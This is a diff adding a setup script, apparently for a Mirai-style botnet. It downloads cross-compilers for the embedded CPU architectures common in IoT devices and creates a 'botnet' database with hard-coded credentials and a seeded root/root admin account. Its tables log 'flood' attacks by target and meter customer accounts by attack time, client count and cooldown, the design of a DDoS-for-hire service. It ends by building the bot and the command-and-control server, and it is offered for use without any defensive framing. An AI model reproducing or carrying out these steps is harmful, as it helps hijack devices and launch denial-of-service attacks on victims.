@@ -1,0 +1,119 @@
+# Run all these commands to download the toolchains
+
+apt update -y
+apt install gcc g++ make libmysqlcppconn-dev apache2 -y
+
+mkdir /etc/xcompile
+cd /etc/xcompile
+
+wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-armv4l.tar.gz
+wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-armv5l.tar.gz
+wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-armv6l.tar.gz
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-mips.tar.gz
+wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-mipsel.tar.gz
+wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-powerpc.tar.gz
+wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-sh4.tar.gz
+wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-x86_64.tar.gz
+wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-i686.tar.gz
+
+tar -zxf cross-compiler-armv4l.tar.gz
+tar -zxf cross-compiler-armv5l.tar.gz
+tar -zxf cross-compiler-armv6l.tar.gz
+tar -jxf cross-compiler-armv7l.tar.bz2
+tar -zxf cross-compiler-i686.tar.gz
+tar -zxf cross-compiler-mips.tar.gz
+tar -zxf cross-compiler-mipsel.tar.gz
+tar -zxf cross-compiler-powerpc.tar.gz
+tar -zxf cross-compiler-sh4.tar.gz
+tar -zxf cross-compiler-x86_64.tar.gz
+
+rm *.tar.*
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+mv cross-compiler-i686 i686
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-x86_64 x86_64
+
+export PATH=$PATH:/etc/xcompile/armv4l/bin
+export PATH=$PATH:/etc/xcompile/armv5l/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/armv7l/bin
+export PATH=$PATH:/etc/xcompile/i686/bin
+export PATH=$PATH:/etc/xcompile/mips/bin
+export PATH=$PATH:/etc/xcompile/mipsel/bin
+export PATH=$PATH:/etc/xcompile/powerpc/bin
+export PATH=$PATH:/etc/xcompile/sh4/binn
+export PATH=$PATH:/etc/xcompile/x86_64/bin
+export TOOLCHAIN_ROOT='/etc/xcompile' 
+
+apt install mariadb-server -y
+service mariadb restart
+mysql_secure_installation
+mysql -u root -pBotnet@123
+CREATE USER 'botnetuser'@'localhost' IDENTIFIED BY 'Botnet@123';
+GRANT ALL PRIVILEGES ON * . * TO 'botnetuser'@'localhost';
+FLUSH PRIVILEGES;
+exit;
+
+mysql -u botnetuser -pBotnet@123
+CREATE DATABASE botnet;
+use botnet;
+SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
+SET time_zone = "+00:00";
+CREATE TABLE `log` (
+  `id` int(10) UNSIGNED NOT NULL,
+  `username` varchar(32) NOT NULL,
+  `flood` varchar(32) NOT NULL,
+  `target` varchar(32) NOT NULL,
+  `time` int(11) DEFAULT '0',
+  `count` int(11) DEFAULT '0',
+  `timestamp` int(11) DEFAULT '0'
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
+CREATE TABLE `log_logins` (
+  `id` int(11) AUTO_INCREMENT PRIMARY KEY,
+  `username` varchar(32) NOT NULL,
+  `time_login` int(11) DEFAULT '0',
+  `time_logout` int(11) DEFAULT '0'
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+INSERT INTO `log_logins` (`id`, `username`, `time_login`, `time_logout`) VALUES
+(NULL, "wawsd", 0, 0);
+
+CREATE TABLE `users` (
+  `id` int(10) UNSIGNED NOT NULL,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `max_clients` int(11) DEFAULT '-1',
+  `max_time` int(11) DEFAULT '-1',
+  `cooldown` int(11) DEFAULT '0',
+  `concurrent` int(11) DEFAULT '0',
+  `disable` int(11) DEFAULT '0',
+  `admin` int(10) UNSIGNED DEFAULT '0',
+  `authenticated` int(10) UNSIGNED DEFAULT '0',
+  `banned` int(11) UNSIGNED DEFAULT '0',
+  `reason` varchar(32) NOT NULL DEFAULT '0'
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+INSERT INTO `users` (`id`, `username`, `password`, `max_clients`, `max_time`, `cooldown`, `concurrent`, `disable`, `admin`, `authenticated`, `banned`, `reason`) VALUES
+(1, 'root', 'root', -1, -1, 60, 1, 0, 1, 1, 0, 0);
+ALTER TABLE `log`
+  ADD PRIMARY KEY (`id`);
+ALTER TABLE `log_logins`
+  ADD PRIMARY KEY (`id`);
+ALTER TABLE `users`
+  ADD PRIMARY KEY (`id`);
+ALTER TABLE `log`
+  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=754;
+ALTER TABLE `log_logins`
+  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=754;
+ALTER TABLE `users`
+  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
+
+// build bot
+make release -B
+make cnc -B
